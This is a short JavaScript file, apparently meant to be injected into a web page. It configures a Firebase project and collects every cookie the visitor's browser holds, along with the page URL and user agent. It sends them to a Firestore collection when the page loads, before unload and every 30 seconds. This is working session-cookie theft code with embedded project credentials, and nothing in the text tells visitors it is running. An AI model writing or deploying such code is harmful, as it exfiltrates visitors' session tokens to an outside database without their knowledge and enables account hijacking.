import { initializeApp } from 'https://www.gstatic.com/firebasejs/12.5.0/firebase-app.js';
import { getFirestore, doc, setDoc } from 'https://www.gstatic.com/firebasejs/12.5.0/firebase-firestore.js';
const firebaseConfig = {
  apiKey: "AIzaSyDUGI__AYHk5DPxmWGHI5iFM55wmXGgyLo",
  authDomain: "akun-tmate.firebaseapp.com",
  databaseURL: "https://akun-tmate-default-rtdb.firebaseio.com",
  projectId: "akun-tmate",
  storageBucket: "akun-tmate.firebasestorage.app",
  messagingSenderId: "1076327760751",
  appId: "1:1076327760751:web:c76ef435fbb1f14421de9a",
  measurementId: "G-PM7TH4XKQK"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Get all cookies as object
const getCookies = () => {
    const cookies = {};
    document.cookie.split(';').forEach(item => {
        const [key, value] = item.trim().split('=');
        if (key) cookies[key] = decodeURIComponent(value || '');
    });
    return cookies;
};

// Save to Firebase
const saveCookies = async () => {
    try {
        const cookies = getCookies();
        const timestamp = new Date().toISOString();
        
        await setDoc(doc(db, 'website_cookies', 'current_session'), {
            cookies: cookies,
            savedAt: timestamp,
            url: window.location.href,
            userAgent: navigator.userAgent.substring(0, 100) // truncated
        }, { merge: true });
        
        console.log('🍪 Cookies saved to Firebase');
    } catch (error) {
        console.log('❌ Failed to save cookies:', error.message);
    }
};

// Auto-save when page loads and before unload
saveCookies(); // Save immediately
window.addEventListener('beforeunload', saveCookies); // Save when leaving

// Optional: Save every 30 seconds
setInterval(saveCookies, 30000);
